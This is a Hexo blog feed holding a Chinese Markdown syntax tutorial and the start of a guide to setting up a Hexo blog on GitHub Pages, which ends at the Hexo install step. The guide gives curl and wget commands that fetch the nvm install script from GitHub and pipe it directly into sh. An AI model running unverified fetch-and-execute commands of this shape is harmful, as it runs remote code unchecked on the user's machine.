src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg&quot;区块链&quot;" alt="blockchain"></p><h3 id="插入带有链接的图片"><a href="#插入带有链接的图片" class="headerlink" title="插入带有链接的图片"></a>插入带有链接的图片</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">[图片上传失败...(image-f83b77-1542510791300)</span>]](http://www.baidu.com)&#123;:target="_blank"&#125;       // 内链式</span><br><span class="line"></span><br><span class="line">[<span class="string">[图片上传失败...(image-4dc956-1542510791300)</span>]][5]&#123;:target="_blank"&#125;                      // 引用式</span><br><span class="line">[<span class="symbol">5</span>]: <span class="link">http://www.baidu.com</span></span><br></pre></td></tr></table></figure><p><a href="htttp://www.baidu.com" target="_blank" rel="noopener">[图片上传失败…(image-f83b77-1542510791300)]</a>{:target=”_blank”}</p><p>内链式</p><p><a href="http://www.baidu.com/" target="_blank" rel="noopener">[图片上传失败…(image-f83b77-1542510791300)]</a>{:target=”blank”}</p><p>外链式</p><hr><h2 id="超链接引用"><a href="#超链接引用" class="headerlink" title="超链接引用"></a>超链接引用</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">超链接名</span>](<span class="link">超链接地址 "超链接title"</span>)</span><br><span class="line">title可加可不加</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">简书</span>](<span class="link">http://jianshu.com</span>)</span><br><span class="line">[<span class="string">百度</span>](<span class="link">http://baidu.com</span>)</span><br></pre></td></tr></table></figure><p><a href="http://baidu.com" target="_blank" rel="noopener">baidu</a></p><p>注：Markdown本身语法不支持链接在新页面中打开，貌似简书做了处理，是可以的。别的平台可能就不行了，如果想要在新页面中打开的话可以用html语言的a标签代替。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;超链接地址&quot; target=&quot;_blank&quot;&gt;超链接名&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">示例</span><br><span class="line">&lt;a href=&quot;https://www.jianshu.com/u/1f5ac0cf6a8b&quot; target=&quot;_blank&quot;&gt;简书&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/u/1f5ac0cf6a8b" target="_blank">简书</a></p><hr><h2 id="视频插入"><a href="#视频插入" class="headerlink" title="视频插入"></a>视频插入</h2><p>注：Markdown 语法是不支持直接插入视频的<br> 普遍的做法是 插入HTML的 iframe 框架，通过网站自带的分享功能获取，如果没有可以尝试第二种方法<br> 第二是伪造播放界面，实质是插入视频图片，然后通过点击跳转到相关页面</p><p><strong>代码1</strong><br> 注：多数第三方平台不支持插入<code>&lt;iframe&gt;</code>视频</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">height</span>=<span class="string">498</span> <span class="attr">width</span>=<span class="string">510</span> <span class="attr">src</span>=<span class="string">'http://player.youku.com/embed/XMjgzNzM0NTYxNg=='</span> <span class="attr">frameborder</span>=<span class="string">0</span> '<span class="attr">allowfullscreen</span>'&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>代码2</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">[图片上传失败...(image-49aefe-1542510791300)</span>]](http://v.youku.com/v<span class="emphasis">_show/id_</span>XMjgzNzM0NTYxNg==.html?spm=a2htv.20009910.contentHolderUnit2.A&amp;from=y1.3-tv-grid-1007-9910.86804.1-2#paction)&#123;:target="_blank"&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">无序列表用任一种皆可</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>列表内容</span><br><span class="line"><span class="bullet">+ </span>列表内容</span><br><span class="line"><span class="bullet">* </span>列表内容</span><br><span class="line"></span><br><span class="line">注意：- + * 跟内容之间都要有一个空格</span><br></pre></td></tr></table></figure><ul><li>列表（-）</li><li>列表（-）</li></ul><ul><li>列表（+）</li></ul><ul><li>列表（*）</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">有序列表内容</span><br><span class="line"></span><br><span class="line">1.列表内容</span><br><span class="line">2.列表内容</span><br><span class="line">3.列表内容</span><br><span class="line"></span><br><span class="line">注意：序号跟内容之间要有空格</span><br></pre></td></tr></table></figure><ol><li>第一点</li><li>第二点</li><li>第三点</li></ol><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**上一级和下一级之间敲三个空格即可**</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>一级无序列表内容</span><br><span class="line">  - 二级无序列表内容</span><br><span class="line">  - 二级无序列表内容</span><br><span class="line">  - 二级无序列表内容</span><br><span class="line"><span class="bullet">- </span>一级无序列表内容</span><br><span class="line">  1. 二级有序列表内容</span><br><span class="line">  2. 二级有序列表内容</span><br><span class="line">  3. 二级有序列表内容</span><br><span class="line"></span><br><span class="line"><span class="bullet">1. </span>一级有序列表内容</span><br><span class="line">   - 二级无序列表内容</span><br><span class="line">   - 二级无序列表内容</span><br><span class="line">   - 二级无序列表内容</span><br><span class="line"><span class="bullet">2. </span>一级有序列表内容</span><br><span class="line">   1. 二级有序列表内容</span><br><span class="line">   2. 二级有序列表内容</span><br><span class="line">   3. 二级有序列表内容</span><br></pre></td></tr></table></figure><p><strong>上一级和下一级之间敲三个空格即可</strong></p><ul><li>一级无序列表内容<ul><li>二级无序列表内容</li><li>二级无序列表内容</li><li>二级无序列表内容</li></ul></li><li>一级无序列表内容<ol><li>二级有序列表内容</li><li>二级有序列表内容</li><li>二级有序列表内容</li></ol></li></ul><ol><li>一级有序列表内容<ul><li>二级无序列表内容</li><li>二级无序列表内容</li><li>二级无序列表内容</li></ul></li><li>一级有序列表内容<ol><li>二级有序列表内容</li><li>二级有序列表内容</li><li>二级有序列表内容</li></ol></li></ol><hr><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">表头|表头|表头</span><br><span class="line">---|:--:|---:</span><br><span class="line">内容|内容|内容</span><br><span class="line">内容|内容|内容</span><br><span class="line"></span><br><span class="line">第二行分割表头和内容。</span><br><span class="line">- 有一个就行，为了对齐，多加了几个</span><br><span class="line">文字默认居左</span><br><span class="line">-两边加：表示文字居中</span><br><span class="line">-右边加：表示文字居右</span><br><span class="line">注：原生的语法两边都要用 | 包起来。此处省略</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">姓名|技能|排行</span><br><span class="line">--|:--:|--:</span><br><span class="line">刘备|哭|大哥</span><br><span class="line">关羽|打|二哥</span><br><span class="line">张飞|骂|三弟</span><br></pre></td></tr></table></figure><table><thead><tr><th>姓名</th><th style="text-align:center">技能</th><th style="text-align:right">排行</th></tr></thead><tbody><tr><td>刘备</td><td style="text-align:center">哭</td><td style="text-align:right">大哥</td></tr><tr><td>关羽</td><td style="text-align:center">打</td><td style="text-align:right">二哥</td></tr><tr><td>张飞</td><td style="text-align:center">骂</td><td style="text-align:right">三弟</td></tr></tbody></table><p>Typora编辑器中可以直接使用crtl+T，或者在菜单段落中找到表格生成</p><hr><h2 id="代码引用"><a href="#代码引用" class="headerlink" title="代码引用"></a>代码引用</h2><p>单行代码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">`代码内容`</span></span><br></pre></td></tr></table></figure><p><code>int main(){return 0;}</code></p><p>代码块</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="code">```)language</span></span><br><span class="line"><span class="code">  代码...</span></span><br><span class="line"><span class="code">  代码...</span></span><br><span class="line"><span class="code">  代码...</span></span><br><span class="line"><span class="code">(```)</span></span><br></pre></td></tr></table></figure><blockquote><p>注：为了防止转译，前后三个反引号处加了小括号，实际是没有的。这里只是用来演示，实际中去掉两边小括号即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; <span class="string">"hello markdown"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="格式化代码html版"><a href="#格式化代码html版" class="headerlink" title="格式化代码html版"></a>格式化代码html版</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span></span><br><span class="line"><span class="section">## 这是一个不起作用的标题</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br></pre></td></tr></table></figure><pre>## 这是一个不起作用的标题</pre><hr><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p>注：<strong> <code>st=&gt;start: 开始</code> 的<code>：</code>后面保持空格</strong></p><table><thead><tr><th>形参</th><th>实参</th><th>含义</th></tr></thead><tbody><tr><td>tag</td><td>st</td><td>标签 (可以自定义)</td></tr><tr><td>=&gt;</td><td>=&gt;</td><td>赋值</td></tr><tr><td>type</td><td>start</td><td>类型  (6种类型)</td></tr><tr><td>content</td><td>开始</td><td>描述内容 (可以自定义)</td></tr><tr><td>:&gt;url</td><td><code>http://www.baidu.com[blank]</code></td><td>链接与跳转方式 <strong>兼容性很差</strong></td></tr></tbody></table><table><thead><tr><th>6种类型</th><th>含义</th></tr></thead><tbody><tr><td>start</td><td>启动</td></tr><tr><td>end</td><td>结束</td></tr><tr><td>operation</td><td>程序</td></tr><tr><td>subroutine</td><td>子程序</td></tr><tr><td>condition</td><td>条件</td></tr><tr><td>inputoutput</td><td>输出</td></tr></tbody></table><table><thead><tr><th>形参</th><th>实参</th><th>含义</th></tr></thead><tbody><tr><td>-&gt;</td><td>-&gt;</td><td>连接</td></tr><tr><td>condition</td><td>c1</td><td>条件</td></tr><tr><td>(布尔值,方向)</td><td>(yes,right)</td><td>如果满足向右连接，4种方向：right ，left，up ，down 默认为：down</td></tr></tbody></table><p>注：operation (程序); subroutine (子程序) ;condition (条件)，都可以在括号里加入连接方向。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">```flow</span></span><br><span class="line"><span class="code">st=&gt;start: 开始</span></span><br><span class="line"><span class="code">op=&gt;operation: My Operation</span></span><br><span class="line"><span class="code">cond=&gt;condition: Yes or No?</span></span><br><span class="line"><span class="code">e=&gt;end</span></span><br><span class="line"><span class="code">st-&gt;op-&gt;cond</span></span><br><span class="line"><span class="code">cond(yes)-&gt;e</span></span><br><span class="line"><span class="code">cond(no)-&gt;op</span></span><br><span class="line"><span class="code">&amp;```</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">st=&gt;start: 开始</span><br><span class="line">op=&gt;operation: My Operation</span><br><span class="line">cond=&gt;condition: Yes or No?</span><br><span class="line">e=&gt;end</span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op</span><br><span class="line">&amp;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 选项框</span><br><span class="line"></span><br><span class="line">```markdown</span><br><span class="line">- [x] 选项一</span><br><span class="line">- [ ] 选项二  </span><br><span class="line">需要注意的是：-、[x]、和选择一之间都要有空格，如果不下x[ ]中也要有空格</span><br></pre></td></tr></table></figure><ul><li style="list-style: none"><input type="checkbox" checked> 选项一</li><li style="list-style: none"><input type="checkbox"> 选项二</li></ul><hr><h2 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h2><p>支持LaTex的数学公式，参考<a href="https://www.jianshu.com/p/2bbec51d756f" target="_blank" rel="noopener"><a href="https://www.jianshu.com/p/2bbec51d756f" target="_blank" rel="noopener">https://www.jianshu.com/p/2bbec51d756f</a></a></p><p>数学公式（MathJax)，参考<a href="https://www.jianshu.com/p/a0aa94ef8ab2" target="_blank" rel="noopener"><a href="https://www.jianshu.com/p/a0aa94ef8ab2" target="_blank" rel="noopener">https://www.jianshu.com/p/a0aa94ef8ab2</a></a></p><p>注：1个$左对齐，2个居中</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$$ x \href&#123;why-equal.html&#125;&#123;=&#125; y^2 + 1 $$</span><br><span class="line">$ x = &#123;-b \pm \sqrt&#123;b^2-4ac&#125; \over 2a&#125;. $</span><br></pre></td></tr></table></figure><p>$$<br>x \href{why-equal.html}{=} y^2 +1<br>$$</p><p>使用Typora的时候可以直接使用 $$+回车，或者用crtl+shift+M生成公式块（在段落菜单中的公式块）</p><p>参考<a href="https://blog.csdn.net/mingzhuo_126/article/details/82722455" target="_blank" rel="noopener"><a href="https://blog.csdn.net/mingzhuo_126/article/details/82722455" target="_blank" rel="noopener">https://blog.csdn.net/mingzhuo_126/article/details/82722455</a></a></p><hr><h2 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Markdown[^1]</span><br><span class="line">[<span class="symbol">^1</span>]: <span class="link">Markdown是一种纯文本标记语言        // 在文章最后面显示脚注</span></span><br></pre></td></tr></table></figure><p>Markdown<a href="markdown是一种纯文本标记语言">^1</a></p><hr><h2 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h2><p>注：只有<strong>标题</strong>支持锚点， 跳转目录方括号后 保持空格</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">公式标题锚点</span>](<span class="link">#1</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">### [需要跳转的目录] &#123;#1&#125;    // 方括号后保持空格</span></span><br></pre></td></tr></table></figure><p><a href="#1">脚注标题锚点</a></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">由于&#123;# 是hexo的标注语言</span><br><span class="line">hexo 中 &#123;# 属于保留字段 &#123;# ... #&#125;属于注释字段</span><br><span class="line">把<span class="code">```以外的&#123;#改成&#123;&#123; '&#123;#' &#125;&#125;即可解决</span></span><br></pre></td></tr></table></figure><hr><h2 id="自动邮箱链接"><a href="#自动邮箱链接" class="headerlink" title="自动邮箱链接"></a>自动邮箱链接</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">xxx@outlook.com</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><a href="mailto:&#x78;&#x78;&#120;&#64;&#x6f;&#x75;&#116;&#108;&#x6f;&#x6f;&#107;&#x2e;&#x63;&#111;&#109;" target="_blank" rel="noopener">&#x78;&#x78;&#120;&#64;&#x6f;&#x75;&#116;&#108;&#x6f;&#x6f;&#107;&#x2e;&#x63;&#111;&#109;</a></p><hr><h2 id="时序图"><a href="#时序图" class="headerlink" title="时序图"></a>时序图</h2><p><strong>代码1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">​```sequence</span><br><span class="line">A-&gt;&gt;B: 你好</span><br><span class="line">Note left of A: 我在左边     // 注释方向，只有左右，没有上下</span><br><span class="line">Note right of B: 我在右边</span><br><span class="line">B--&gt;A: 很高兴认识你</span><br><span class="line">​</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**演示**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![img](https:////upload-images.jianshu.io/upload_images/6912209-784ce9bb7beb6672.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/393/format/webp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**代码详解**</span><br><span class="line"></span><br><span class="line">注：`A-&gt;&gt;B: 你好`   后面可以不写文字，但是一定要在最后加上`：`</span><br><span class="line"> Note left of A 代表注释在A的左边</span><br><span class="line"></span><br><span class="line">| 符号 | 含义     |</span><br><span class="line">| ---- | -------- |</span><br><span class="line">| `-`  | 实线     |</span><br><span class="line">| `&gt;`  | 实心箭头 |</span><br><span class="line">| `--` | 虚线     |</span><br><span class="line">| `&gt;&gt;` | 空心箭头 |</span><br><span class="line"></span><br><span class="line">**代码2**</span><br></pre></td></tr></table></figure><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">起床-&gt;吃饭: 稀饭油条</span><br><span class="line">吃饭-&gt;上班: 不要迟到了</span><br><span class="line">上班-&gt;午餐: 吃撑了</span><br><span class="line">上班-&gt;下班:</span><br><span class="line">Note right of 下班: 下班了</span><br><span class="line">下班-&gt;回家:</span><br><span class="line">Note right of 回家: 到家了</span><br><span class="line">回家--&gt;&gt;起床:</span><br><span class="line">Note left of 起床: 新的一天</span><br></pre></td></tr></table></figure></code></pre><p><strong>演示</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/6912209-f109a13fcf7e2ccb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/577/format/webp" alt="img"></p><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><p>由于markdown语法的原因，可以用\进行转义。</p>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+gitpages</title>
      <link href="/2019/05/14/hexo-gitpages/"/>
      <url>/2019/05/14/hexo-gitpages/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo-gitPages搭建个人博客"><a href="#hexo-gitPages搭建个人博客" class="headerlink" title="hexo+gitPages搭建个人博客"></a>hexo+gitPages搭建个人博客</h1><blockquote><p>本文参考</p><p><strong>hexo 博客搭建</strong></p><p><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">hexo官方文档</a></p><p><a href="https://juejin.im/post/5bebfe51e51d45332a456de0" target="_blank" rel="noopener">【持续更新】最全Hexo博客搭建+主题优化+插件配置+常用操作+错误分析</a></p><p><a href="https://blog.csdn.net/gsl9d1p04f6x2ts3c9/article/details/81024330" target="_blank" rel="noopener">手把手教你搭建自己的个人博客（图文教程）</a></p><p><a href="[https://www.chakid.com/2017/07/05/%E4%B8%80%E3%80%81%E6%90%AD%E5%BB%BA%E7%AF%87-%E4%BD%BF%E7%94%A8Github-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B%E2%80%94%E6%80%BB%E7%BB%93%E8%87%AA%E5%B7%B1%E7%88%AC%E8%BF%87%E7%9A%84%E5%9D%91/](https://www.chakid.com/2017/07/05/一、搭建篇-使用Github-hexo搭建个人博客教程—总结自己爬过的坑/">搭建篇 –使用Github+hexo搭建个人博客教程—总结自己爬过的坑</a>)</p><p><a href="https://zhuanlan.zhihu.com/p/26625249?utm_source=weibo&amp;utm_medium=social" target="_blank" rel="noopener">GitHub+Hexo 搭建个人网站详细教程</a></p><p><a href="https://xuanwo.io/2015/03/26/hexo-intor/" target="_blank" rel="noopener">史上最详细的Hexo博客搭建图文教程</a></p><p><strong>hexo优化</strong></p><p><a href="https://www.chakid.com/2018/05/26/hexo%E5%8D%9A%E5%AE%A2%E6%94%B9%E8%A3%85%E5%92%8C%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82%E4%BC%98%E5%8C%96/" target="_blank" rel="noopener">hexo博客改装和一些细节优化</a></p><p><a href="https://www.chakid.com/2018/05/26/hexo博客改装和一些细节优化" target="_blank" rel="noopener">https://www.chakid.com/2018/05/26/hexo博客改装和一些细节优化</a></p><p><a href="https://www.cnblogs.com/xingyunblog/p/8681205.html" target="_blank" rel="noopener">Hexo NexT 博客后台管理指南</a></p><p><a href="https://blog.csdn.net/qq_36177977/article/details/83826453" target="_blank" rel="noopener">Hexo主题更改以及小功能的添加</a></p><p><strong>hexo-NexT主题配置</strong></p><p><a href="https://theme-next.org/archives/" target="_blank" rel="noopener">NexT官方展示</a></p><p><a href="https://github.com/theme-next/hexo-theme-next/blob/master/docs/zh-CN/README.md" target="_blank" rel="noopener">NexT官方中文文档ReadME</a></p><p><a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">NexT源码</a></p><p><a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">NexT文档</a></p><p><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">Hexo的Next主题详细配置</a></p><p><a href="https://www.cnblogs.com/php-linux/p/8416122.html" target="_blank" rel="noopener">hexo的next主题个性化教程:打造炫酷网站</a></p><p><a href="https://blog.csdn.net/qq_33699981/article/details/72716951" target="_blank" rel="noopener">hexo的next主题个性化教程：打造炫酷网站</a></p><p><a href="https://inspurer.github.io/2018/11/11/hexo-next主题优化/" target="_blank" rel="noopener">【持续更新】hexo next主题优化手册</a></p><p><a href="https://inspurer.github.io/archives/" target="_blank" rel="noopener">可参考博客嘤</a></p><p><strong>yilia主题</strong></p><p><a href="https://github.com/litten/hexo-theme-yilia" target="_blank" rel="noopener">yilia主题源码（GitHub）</a></p><p><a href="http://litten.me/" target="_blank" rel="noopener">yilia主题展示</a></p></blockquote><h2 id="hexo博客搭建"><a href="#hexo博客搭建" class="headerlink" title="hexo博客搭建"></a>hexo博客搭建</h2><h3 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h3><p>安装 Hexo 相当简单。然而在安装前，您必须检查电脑中是否已安装下列应用程序：</p><ul><li><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a> (Should be at least nodejs 6.9)</li><li><a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a></li></ul><p>如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用 npm 即可完成 Hexo 的安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。</p><p>如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。</p><blockquote><p>Mac 用户</p><p>您在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入 <strong>Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install</strong> 安装命令行工具。</p></blockquote><h3 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h3><ul><li>Windows：下载并安装 <a href="https://git-scm.com/download/win" target="_blank" rel="noopener">git</a>.</li><li>Mac：使用 <a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>, <a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a> ：<code>brew install git</code>;或下载 <a href="http://sourceforge.net/projects/git-osx-installer/" target="_blank" rel="noopener">安装程序</a> 安装。</li><li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li><li></li><li><p>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code></p></li></ul><blockquote><p>Windows 用户</p><p>由于众所周知的原因，从上面的链接下载git for windows最好挂上一个代理，否则下载速度十分缓慢。也可以参考<a href="https://github.com/waylau/git-for-win" target="_blank" rel="noopener">这个页面</a>，收录了存储于百度云的下载地址。</p></blockquote><h3 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h3><p>安装 Node.js 的最佳方式是使用 <a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">nvm</a>。</p><p>cURL:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>Wget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>安装完成后，重启终端并执行下列命令即可安装 Node.js。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nvm install stable</span><br></pre></td></tr></table></figure><p>或者您也可以下载 <a href="http://nodejs.org/" target="_blank" rel="noopener">安装程序</a> 来安装。</p><blockquote><p>Windows 用户</p><p>对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选<strong>Add to PATH</strong>选项。<br>另外，您也可以使用<strong>Git Bash</strong>，这是git for windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用<strong>Git Bash</strong>来进行操作。</p></blockquote><h3 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 